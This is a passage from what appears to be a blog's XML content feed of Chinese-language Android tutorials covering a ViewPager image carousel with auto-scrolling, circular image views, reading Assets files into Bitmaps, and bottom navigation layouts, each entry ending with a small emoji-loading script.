spellcheck="true">//获得图片名称,根据名称在内存中查找</span>        String logoName<span class="token operator">=</span>bean<span class="token punctuation">.</span><span class="token function">getLogoname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Bitmap bitmap<span class="token operator">=</span>logoMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>logoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        hoder<span class="token punctuation">.</span>iv<span class="token punctuation">.</span><span class="token function">setImageBitmap</span><span class="token punctuation">(</span>bitmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> convertView<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把矩形图片变成圆形的方法</title>
      <link href="/2020/07/27/ba-ju-xing-tu-pian-bian-cheng-yuan-xing-de-fang-fa/"/>
      <url>/2020/07/27/ba-ju-xing-tu-pian-bian-cheng-yuan-xing-de-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>开源项目的网址：<br><a href="https://github.com/1766095699/CircleImageView" target="_blank" rel="noopener">https://github.com/1766095699/CircleImageView</a><br>需要导入的依赖      </p><pre><code>    implementation 'de.hdodenhof:circleimageview:3.1.0'</code></pre><p><a href="https://imgchr.com/i/aPeYJP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/07/27/aPeYJP.png" alt="效果图"></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>轮播图(ViewPager)用法</title>
      <link href="/2020/07/26/lun-bo-tu/"/>
      <url>/2020/07/26/lun-bo-tu/</url>
      
        <content type="html"><![CDATA[<h2 id="一-XML布局"><a href="#一-XML布局" class="headerlink" title="一.XML布局"></a>一.XML布局</h2><p>下面的Liner是用来给小圆点的,其中先align再marin可以让这个布局自动就是再ViewPager的下方</p><pre><code>&lt;androidx.viewpager.widget.ViewPager   android:id="@+id/starfrag_vp"   android:layout_width="match_parent"   android:layout_height="220dp"  /&gt;  &lt;LinearLayout    android:id="@+id/starfrag_layout"    android:layout_width="match_parent"    android:layout_height="10dp"        android:orientation="horizontal"    android:layout_alignBottom="@id/starfrag_vp"    android:layout_marginBottom="10dp"    android:gravity="center_horizontal"/&gt;</code></pre><h2 id="二-java代码"><a href="#二-java代码" class="headerlink" title="二.java代码"></a>二.java代码</h2><h3 id="1-声明一个ViewPager对象"><a href="#1-声明一个ViewPager对象" class="headerlink" title="1.声明一个ViewPager对象"></a>1.声明一个ViewPager对象</h3><pre><code>ViewPager starVp=getView.findViewById(R.id.xx)</code></pre><h3 id="2-声明一个int数组装本地图片"><a href="#2-声明一个int数组装本地图片" class="headerlink" title="2.声明一个int数组装本地图片"></a>2.声明一个int数组装本地图片</h3><pre><code>int[]imgIds={R.mipmap.bg,R.mipmap.bg1};</code></pre><h3 id="3-声明ViewPager和小圆点ivList的数据源"><a href="#3-声明ViewPager和小圆点ivList的数据源" class="headerlink" title="3.声明ViewPager和小圆点ivList的数据源"></a>3.声明ViewPager和小圆点ivList的数据源</h3><pre><code>List&lt;ImageView&gt;ivList;List&lt;ImageView&gt;poinList;</code></pre><h3 id="4-自定义一个initPager函数来将数据传到3的List中"><a href="#4-自定义一个initPager函数来将数据传到3的List中" class="headerlink" title="4.自定义一个initPager函数来将数据传到3的List中"></a>4.自定义一个initPager函数来将数据传到3的List中</h3><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">initPager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        LinearLayout pointLayout<span class="token punctuation">;</span>        ivList<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        poinList<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span>imgIds<span class="token punctuation">.</span>length <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//ImageView的构造器有多种,我们选择context的这种,用getContext来实例化</span>            ImageView iv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置iv对应的图片资源并且记得设置拉伸XY</span>            iv<span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>imgIds<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            iv<span class="token punctuation">.</span><span class="token function">setScaleType</span><span class="token punctuation">(</span>ImageView<span class="token punctuation">.</span>ScaleType<span class="token punctuation">.</span>FIT_XY<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置图片view的宽高,实例化一个LinearLayout.LayoutParams,选择和父类相同</span>            LinearLayout<span class="token punctuation">.</span>LayoutParams lp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">LinearLayout<span class="token punctuation">.</span>LayoutParams</span><span class="token punctuation">(</span>LinearLayout<span class="token punctuation">.</span>LayoutParams<span class="token punctuation">.</span>MATCH_PARENT<span class="token punctuation">,</span>LinearLayout<span class="token punctuation">.</span>LayoutParams<span class="token punctuation">.</span>MATCH_PARENT<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//把设置的宽高设置进iv</span>            iv<span class="token punctuation">.</span><span class="token function">setLayoutParams</span><span class="token punctuation">(</span>lp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将设置好的图片iv加载到集合当中</span>            ivList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//小圆点的做法和上面基本一样-----------------------------------------------</span>            <span class="token comment" spellcheck="true">//创建图片对应的指示器小圆点</span>            ImageView piv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            piv<span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>mipmap<span class="token punctuation">.</span>point_normal<span class="token punctuation">)</span><span class="token punctuation">;</span>            LinearLayout<span class="token punctuation">.</span>LayoutParams plp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinearLayout<span class="token punctuation">.</span>LayoutParams</span><span class="token punctuation">(</span>LinearLayout<span class="token punctuation">.</span>LayoutParams<span class="token punctuation">.</span>WRAP_CONTENT<span class="token punctuation">,</span> LinearLayout<span class="token punctuation">.</span>LayoutParams<span class="token punctuation">.</span>WRAP_CONTENT<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//设置以下margin值让小圆点有间隔</span>            plp<span class="token punctuation">.</span><span class="token function">setMargins</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            piv<span class="token punctuation">.</span><span class="token function">setLayoutParams</span><span class="token punctuation">(</span>plp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//这步特别注意：要将小圆点添加到布局中,ViewPager是再适配器中addview</span>            pointLayout<span class="token punctuation">.</span><span class="token function">addView</span><span class="token punctuation">(</span>piv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//为了便于操作,将小圆点添加到统一管理的集合当中</span>            poinList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>piv<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//---------------------------------------------------------------------    </span>        <span class="token comment" spellcheck="true">//默认第一个小圆点是获取焦点的状态</span>        poinList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>mipmap<span class="token punctuation">.</span>point_focus<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//利用5中的构造方法,传入context和图片的list</span>        starPagerAdapter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StarPagerAdapter</span><span class="token punctuation">(</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ivList<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//添加适配器</span>        starVp<span class="token punctuation">.</span><span class="token function">setAdapter</span><span class="token punctuation">(</span>starPagerAdapter<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="5-ViewPager的适配器"><a href="#5-ViewPager的适配器" class="headerlink" title="5.ViewPager的适配器"></a>5.ViewPager的适配器</h3><p>首先要新建一个类StarPagerAdapter继承PagerAdpter   </p><p>第一个构造方法：要去拿一下图片资源(别忘了context)<br>第二个方法返回集合大小<br>第三个方法判断两次对象是不是同一个对象</p><p>对于第四和第五个方法：其中contain是ViewGroup的对象,,position返回当前图片位置</p><p>第四个方法是实例化item, 用imageView获取当前img,然后用addView加入到ViewPager的 布中最后返回imageView<br>第五个方法是销毁item,直接获取到当前的图片,然后用removeView(imageView)来销毁</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StarPagerAdapter</span> <span class="token keyword">extends</span> <span class="token class-name">PagerAdapter</span> <span class="token punctuation">{</span>            Context context<span class="token punctuation">;</span>            List<span class="token operator">&lt;</span>ImageView<span class="token operator">></span>imgList<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">StarPagerAdapter</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>ImageView<span class="token operator">></span> imgList<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>context <span class="token operator">=</span> context<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>imgList <span class="token operator">=</span> imgList<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> imgList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isViewFromObject</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> View view<span class="token punctuation">,</span> <span class="token annotation punctuation">@NonNull</span> Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> view<span class="token operator">==</span>object<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//判断两次对象是不是一个对象</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@NonNull</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">instantiateItem</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> ViewGroup container<span class="token punctuation">,</span> <span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ImageView imageView <span class="token operator">=</span> imgList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>        container<span class="token punctuation">.</span><span class="token function">addView</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> imageView<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroyItem</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> ViewGroup container<span class="token punctuation">,</span> <span class="token keyword">int</span> position<span class="token punctuation">,</span> <span class="token annotation punctuation">@NonNull</span> Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ImageView imageView<span class="token operator">=</span>imgList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">;</span>        container<span class="token punctuation">.</span><span class="token function">removeView</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>       </code></pre><h3 id="6-实现滑动图片原点跟着变化监听事件"><a href="#6-实现滑动图片原点跟着变化监听事件" class="headerlink" title="6.实现滑动图片原点跟着变化监听事件"></a>6.实现滑动图片原点跟着变化监听事件</h3><p>里面用到的函数就硬背就行了,功能也好理解</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//设置ViewPager的监听器函数</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setVPListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        starVp<span class="token punctuation">.</span><span class="token function">addOnPageChangeListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ViewPager<span class="token punctuation">.</span>SimpleOnPageChangeListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onPageSelected</span><span class="token punctuation">(</span><span class="token keyword">int</span> position<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span>poinList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    poinList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>mipmap<span class="token punctuation">.</span>point_normal<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                poinList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>mipmap<span class="token punctuation">.</span>point_focus<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="7-实现自动轮播效果-利用handler传递信息"><a href="#7-实现自动轮播效果-利用handler传递信息" class="headerlink" title="7.实现自动轮播效果(利用handler传递信息)"></a>7.实现自动轮播效果(利用handler传递信息)</h3><p>先在onCreate主函数中发送一条信息,重写一下Handler中的handleMessage方法,其中内部一定要注意再发送形成循环,对于一种状态,onCreat中只会发一次handler,所以在匿名方法内部要再发送信息形成循环</p><pre class=" language-java"><code class="language-java">    handler<span class="token punctuation">.</span><span class="token function">sendEmptyMessageDelayed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre><pre class=" language-java"><code class="language-java">    Handler handler<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">handleMessage</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> Message msg<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>what<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">//获取当前ViewPager显示的页面(getCurrentItem是自带的方法)</span>                    <span class="token keyword">int</span> currentItem<span class="token operator">=</span>starVp<span class="token punctuation">.</span><span class="token function">getCurrentItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//判断是否为最后一张,如果是最后一张就回到第一张,否则显示最后一张</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>currentItem<span class="token operator">==</span>ivList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        starVp<span class="token punctuation">.</span><span class="token function">setCurrentItem</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span> <span class="token punctuation">{</span>                        currentItem<span class="token operator">++</span><span class="token punctuation">;</span>                        starVp<span class="token punctuation">.</span><span class="token function">setCurrentItem</span><span class="token punctuation">(</span>currentItem<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//形成循环发送--接受消息的效果,在接受消息的同时也要进行信息发送</span>                    handler<span class="token punctuation">.</span><span class="token function">sendEmptyMessageDelayed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地资源的读取</title>
      <link href="/2020/07/25/ben-di-zi-yuan-de-du-qu/"/>
      <url>/2020/07/25/ben-di-zi-yuan-de-du-qu/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s1.ax1x.com/2020/07/25/aSwICF.png" alt="两种资源文件"><br>一.读取Assets文件夹中的文件<br>    1.创建工具类AssetUtils  </p><p>2.自定义参数读取字符串,参数固定(下图时读Json文件),用AssetManager来读文件夹</p><pre class=" language-java"><code class="language-java">        <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">getJosonFromAssets</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span>String filename<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//1.获取Assets文件夹管理器(固定写法)</span>        AssetManager am <span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAssets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//输出流</span>        ByteArrayOutputStream baos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.获取文件输入流</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//读文件夹中的文件</span>            InputStream is<span class="token operator">=</span>am<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//读取内容到内存流</span>            <span class="token keyword">int</span> hasRead<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span>buf<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                hasRead<span class="token operator">=</span>is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>hasRead<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>hasRead<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String msg<span class="token operator">=</span>baos<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> msg<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>3.用Bitmap读图片读图片</p><pre class=" language-java"><code class="language-java"> <span class="token keyword">public</span> <span class="token keyword">static</span> Bitmap <span class="token function">getBitmapFromAssets</span><span class="token punctuation">(</span>Context context<span class="token punctuation">,</span>String filename<span class="token punctuation">)</span><span class="token punctuation">{</span>        Bitmap bitmap<span class="token operator">=</span>null<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//获取文件夹管理者</span>        AssetManager am<span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">getResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAssets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InputStream is<span class="token operator">=</span>am<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>            bitmap<span class="token operator">=</span> BitmapFactory<span class="token punctuation">.</span><span class="token function">decodeStream</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>            is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> bitmap<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>4.将数据放入数组  </p><pre><code>     //将Assets文件夹中的图片一起读取,放在内存当中,便于管理public static void saveBitmapFromAssets(Context context, StarInfoBean starInfoBean){    logoImgMap = new HashMap&lt;&gt;();    contentImgMap=new HashMap&lt;&gt;();    List&lt;StarInfoBean.StarinfoBean&gt; starlist=starInfoBean.getStarinfo();//注意,之前数据已经解析进starInforBean了    for (int i = 0; i &lt;starlist.size() ; i++) {        //读取图片        String logoname=starlist.get(i).getLogoname();        String filename="xzlogo/"+logoname+".png";        Bitmap logoBm=getBitmapFromAssets(context,filename);        logoImgMap.put(logoname,logoBm);        String contentName="xzcontentlogo/"+logoname+".png";        Bitmap bitmap=getBitmapFromAssets(context,contentName);        contentImgMap.put(logoname,bitmap);    }}</code></pre><p>5.get方法得到数组  </p><pre><code>       public static Map&lt;String,Bitmap&gt;getLogoImgMap(){    return logoImgMap;}public static Map&lt;String,Bitmap&gt;getContentImgMap(){    return contentImgMap;}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安卓开发 </category>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
            <tag> 星梦缘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Stuidio中创建Fragment找不到xml文件的解决方案</title>
      <link href="/2020/07/25/stuidio/"/>
      <url>/2020/07/25/stuidio/</url>
      
        <content type="html"><![CDATA[<p>一.可能是你导入了android.R的包导致的,删去即可<br>二.studio本身的bug,重启stuidio即可</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 安卓开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>底部导航栏布局和界面切换</title>
      <link href="/2020/07/25/di-bu-cai-dan-lan-bu-ju/"/>
      <url>/2020/07/25/di-bu-cai-dan-lan-bu-ju/</url>
      
        <content type="html"><![CDATA[<p><strong><em>先看以下想要实现的效果：</em></strong><br><img src="https://i.loli.net/2020/07/25/JvQVIcnFhyP7uWA.png" alt="效果图"></p><h2 id="一-RadioGroup和RadioButton设置底部布局"><a href="#一-RadioGroup和RadioButton设置底部布局" class="headerlink" title="一.RadioGroup和RadioButton设置底部布局"></a>一.RadioGroup和RadioButton设置底部布局</h2><pre class=" language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RadioGroup</span>        <span class="token attr-name"><span class="token namespace">android:</span>id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@+id/main_rg<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>match_parent<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>60dp<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>layout_alignParentBottom</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>        <span class="token attr-name"><span class="token namespace">android:</span>background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@color/lightyellow<span class="token punctuation">"</span></span>        <span class="token attr-name"><span 